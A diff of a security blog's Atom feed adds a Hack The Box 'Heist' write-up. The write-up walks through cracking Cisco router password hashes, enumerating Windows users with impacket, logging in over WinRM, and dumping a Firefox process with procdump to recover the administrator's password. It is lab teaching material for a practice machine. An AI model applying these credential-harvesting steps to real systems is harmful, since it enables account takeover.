@@ -1,4 +1,273 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-11-23T16:09:50+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Chainsaw</title><link href="https://0xrick.github.io/hack-the-box/chainsaw/" rel="alternate" type="text/html" title="Hack The Box - Chainsaw" /><published>2019-11-23T00:00:00+02:00</published><updated>2019-11-23T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/chainsaw</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/chainsaw/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2019-11-30T16:03:17+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Heist</title><link href="https://0xrick.github.io/hack-the-box/heist/" rel="alternate" type="text/html" title="Hack The Box - Heist" /><published>2019-11-30T00:00:00+02:00</published><updated>2019-11-30T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/heist</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/heist/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Hey guys, today Heist retired and here’s my write-up about it. It’s an easy Windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.149&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;heist.htb&lt;/code&gt;. Let’s jump right in !&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/0.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/heist# nmap -sV -sT -sC -o nmapinitial heist.htb 
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-29 12:01 EST
+Nmap scan report for heist.htb (10.10.10.149)
+Host is up (0.16s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1h59m59s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-11-29T15:02:39
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 80.49 seconds
+root@kali:~/Desktop/HTB/boxes/heist# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, I also ran another scan on port 5895 to see if &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; is running and it was:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/heist# nmap -sV -sT -p 5985 heist.htb                           Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-29 12:05 EST                               Nmap scan report for heist.htb (10.10.10.149)                                                 Host is up (0.42s latency).                                                                   PORT     STATE SERVICE VERSION
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds
+root@kali:~/Desktop/HTB/boxes/heist#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Anonymous authentication wasn’t allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/heist# smbclient --list //heist.htb/ -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+session setup failed: NT_STATUS_LOGON_FAILURE
+root@kali:~/Desktop/HTB/boxes/heist# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;So let’s check the web service.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;The index page had a login form, however there was a guest login option:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+After getting in as &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt; I got this issues page:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;A user called &lt;code class=&quot;highlighter-rouge&quot;&gt;hazard&lt;/code&gt; posted an issue that he’s having some problems with his &lt;code class=&quot;highlighter-rouge&quot;&gt;Cisco&lt;/code&gt; router and he attached the configuration file with the issue.
+&lt;br /&gt;The configuration file had some password hashes and usernames:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!
+!
+ip ssh authentication-retries 5
+ip ssh version 2
+!
+!
+router bgp 100
+ synchronization
+ bgp log-neighbor-changes
+ bgp dampening
+ network 192.168.0.0 mask 300.255.255.0
+ timers bgp 3 9
+ redistribute connected
+!
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.0.1
+!
+!
+access-list 101 permit ip any any
+dialer-list 1 protocol ip list 101
+!
+no ip http server
+no ip http secure-server
+!
+line vty 0 4
+ session-timeout 600
+ authorization exec SSH
+ transport input ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;For the type 7 passwords I used &lt;a href=&quot;http://www.ifm.net.nz/cookbooks/passwordcracker.html&quot;&gt;this online tool&lt;/a&gt; to crack them:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;And for the other hash I cracked it with john:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/heist# cat hash.txt 
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91
+root@kali:~/Desktop/HTB/boxes/heist# john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt 
+Created directory: /root/.john
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+stealth1agent    (?)
+1g 0:00:01:09 DONE (2019-11-29 12:17) 0.01440g/s 50492p/s 50492c/s 50492C/s stealth323..stealth1967
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+root@kali:~/Desktop/HTB/boxes/heist# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;enumerating-users--shell-as-chase--user-flag&quot;&gt;Enumerating Users –&amp;gt; Shell as Chase –&amp;gt; User Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;So far we have &lt;code class=&quot;highlighter-rouge&quot;&gt;hazard&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rout3r&lt;/code&gt; as potential usernames and &lt;code class=&quot;highlighter-rouge&quot;&gt;stealth1agent&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;$uperP@ssword&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Q4)sJu\Y8qz*A3?d&lt;/code&gt; as potential passwords.
+&lt;br /&gt;I tried different combinations and I could authenticate to &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;hazard : stealth1agent&lt;/code&gt;, however there weren’t any useful shares:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/heist# smbclient --list //heist.htb/ -U 'hazard'
+Enter WORKGROUP\hazard's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+root@kali:~/Desktop/HTB/boxes/heist# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I used &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lookupsid.py&lt;/code&gt;&lt;/a&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to enumerate the other users:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/heist# /opt/impacket/examples/lookupsid.py hazard:stealth1agent@heist.htb
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Brute forcing SIDs at heist.htb
+[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+root@kali:~/Desktop/HTB/boxes/heist# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Then I could authenticate to &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;chase : Q4)sJu\Y8qz*A3?d&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/6.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;administrator-password-from-firefox-process-dump--shell-as-administrator--root-flag&quot;&gt;Administrator Password from Firefox Process Dump –&amp;gt; Shell as Administrator –&amp;gt; Root Flag&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;After enumerating the box for a while I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt; was installed on the box which is unusual:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming&amp;gt; ls
+
+    Directory: C:\Users\Chase\appdata\Roaming
+Mode                LastWriteTime         Length Name                                         ----                -------------         ------ ----                                         d-----        4/22/2019   7:14 AM                Adobe                                       d---s-        4/22/2019   7:14 AM                Microsoft                                   d-----        4/22/2019   8:01 AM                Mozilla                                     *Evil-WinRM* PS C:\Users\Chase\appdata\Roaming&amp;gt; cd Mozilla
+*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&amp;gt; ls
+
+    Directory: C:\Users\Chase\appdata\Roaming\Mozilla
+
+Mode                LastWriteTime         Length Name        
+----                -------------         ------ ----
+
+d-----        4/22/2019   8:01 AM                Extensions     
+d-----        4/22/2019   8:01 AM                Firefox
+d-----        4/22/2019   8:01 AM                SystemExtensionsDev
+*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;And there were some &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt; processes running:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&amp;gt; ps
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+----------
+ REDACTED
+----------
+    358      26    16304     279888       0.77   1408   1 firefox
+    343      19     9876     264068       0.88   4980   1 firefox
+    408      31    17344      60988       1.92   5096   1 firefox
+    390      30    26184      58192       9.94   6556   1 firefox
+   1232      68   110456     183140      22.83   7076   1 firefox
+----------
+ REDACTED
+----------
+*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I uploaded &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/procdump&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;procdump.exe&lt;/code&gt;&lt;/a&gt; and dumped one of these processes:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\Chase\appdata\Roaming\Mozilla&amp;gt; cd C:\Windows\System32\spool\drivers\color
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&amp;gt; upload procdump64.exe
+Info: Uploading procdump64.exe to C:\windows\system32\spool\drivers\color\procdump64.exe
+
+Data: 455560 bytes of 455560 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color&amp;gt; .\procdump64.exe -accepteula -ma 4980
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[21:15:31] Dump 1 initiated: C:\Windows\System32\spool\drivers\color\firefox.exe_191129_211531.dmp
+[21:15:32] Dump 1 writing: Estimated dump file size is 265 MB.
+[21:15:35] Dump 1 complete: 265 MB written in 3.6 seconds
+[21:15:35] Dump count reached.
+
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Then I uploaded &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/strings&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strings.exe&lt;/code&gt;&lt;/a&gt; and used it on the dump and saved the output to another file:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&amp;gt; upload strings64.exe
+Info: Uploading strings64.exe to C:\windows\system32\spool\drivers\color\strings64.exe
+
+Data: 218676 bytes of 218676 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&amp;gt; cmd /c &quot;strings64.exe -accepteula firefox.exe_191129_211531.dmp &amp;gt; firefox.exe_191129_211531.txt&quot;
+cmd.exe :
+    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Strings v2.53 - Search for ANSI and Unicode strings in binary images.       
+Copyright (C) 1999-2016 Mark Russinovich             
+Sysinternals - www.sysinternals.com
+*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I searched for the word “password” and found Administrator’s credentials exposed in some &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; requests:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*Evil-WinRM* PS C:\windows\system32\spool\drivers\color&amp;gt; findstr &quot;password&quot; ./firefox.exe_191129_211531.txt
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=                  
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=                  
+RG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=
+MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;amp;login_password=4dD!5}x/re8]FBuZ&amp;amp;login=
+browser.safebrowsing.passwords.enabled                                      
+services.sync.engine.passwords.validation.percentageChance 
+security.ask_for_password
+----------
+ REDACTED
+----------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/heist/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;And we owned root !
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chainsaw/&quot;&gt;Hack The Box - Chainsaw&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="smb" /><category term="winrm" /><summary type="html">Quick Summary Hey guys, today Heist retired and here’s my write-up about it. It’s an easy Windows machine and its ip is 10.10.10.149, I added it to /etc/hosts as heist.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/heist# nmap -sV -sT -sC -o nmapinitial heist.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-29 12:01 EST Nmap scan report for heist.htb (10.10.10.149) Host is up (0.16s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/heist/0.png" /></entry><entry><title type="html">Hack The Box - Chainsaw</title><link href="https://0xrick.github.io/hack-the-box/chainsaw/" rel="alternate" type="text/html" title="Hack The Box - Chainsaw" /><published>2019-11-23T00:00:00+02:00</published><updated>2019-11-23T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/chainsaw</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/chainsaw/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, today Chainsaw retired and here’s my write-up about it. It was a great machine with vulnerable smart contracts and other fun stuff. I enjoyed it and I learned a lot while solving it. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.142&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;chainsaw.htb&lt;/code&gt;. Let’s jump right in !&lt;br /&gt;
@@ -982,7 +1251,8 @@ root@chainsaw:/home/bobby/projects/ChainsawClub#
 &lt;br /&gt;Thanks for reading.
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/networked/&quot;&gt;Hack The Box - Networked&lt;/a&gt;&lt;/p&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/networked/&quot;&gt;Hack The Box - Networked&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/heist/&quot;&gt;Hack The Box - Heist&lt;/a&gt;&lt;/p&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="blockchain" /><category term="smart-contracts" /><category term="rce" /><category term="python" /><category term="solidity" /><category term="exploit-development" /><category term="code-analysis" /><summary type="html">Quick Summary Hey guys, today Chainsaw retired and here’s my write-up about it. It was a great machine with vulnerable smart contracts and other fun stuff. I enjoyed it and I learned a lot while solving it. It’s a Linux box and its ip is 10.10.10.142, I added it to /etc/hosts as chainsaw.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/chainsaw# nmap -sV -sT -sC -o nmapinitial chainsaw.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-22 18:34 EET Nmap scan report for chainsaw.htb (10.10.10.142) Host is up (1.2s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r–r– 1 1001 1001 23828 Dec 05 2018 WeaponizedPing.json | -rw-r–r– 1 1001 1001 243 Dec 12 2018 WeaponizedPing.sol |-rw-r–r– 1 1001 1001 44 Nov 22 05:03 address.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.xx.xx | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 5 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA) | 256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA) | 256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/chainsaw/0.png" /></entry><entry><title type="html">EGCTF 2019 - Qualification Round</title><link href="https://0xrick.github.io/ctfs/egctf-qual/" rel="alternate" type="text/html" title="EGCTF 2019 - Qualification Round" /><published>2019-11-17T00:00:00+02:00</published><updated>2019-11-17T00:00:00+02:00</updated><id>https://0xrick.github.io/ctfs/egctf-qual</id><content type="html" xml:base="https://0xrick.github.io/ctfs/egctf-qual/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
@@ -6178,163 +6448,4 @@ root@kaneki-pc:/tmp# ssh-add -l
 &lt;br /&gt;
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/swagshop/&quot;&gt;Hack The Box - Swagshop&lt;/a&gt;
 &lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/writeup/&quot;&gt;Hack The Box - Writeup&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="ssh" /><category term="git" /><category term="networking" /><category term="pivoting" /><summary type="html">Quick Summary Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is 10.10.10.101, I added it to /etc/hosts as ghoul.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/ghoul# nmap -sV -sT -sC -o nmapinitial ghoul.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 12:47 EET Nmap scan report for ghoul.htb (10.10.10.101) Host is up (0.22s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA) |_ 256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Aogiri Tree 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA) | 256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA) | 256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=Aogiri |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 - Error report Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/ghoul/0.png" /></entry><entry><title type="html">Hack The Box - Swagshop</title><link href="https://0xrick.github.io/hack-the-box/swagshop/" rel="alternate" type="text/html" title="Hack The Box - Swagshop" 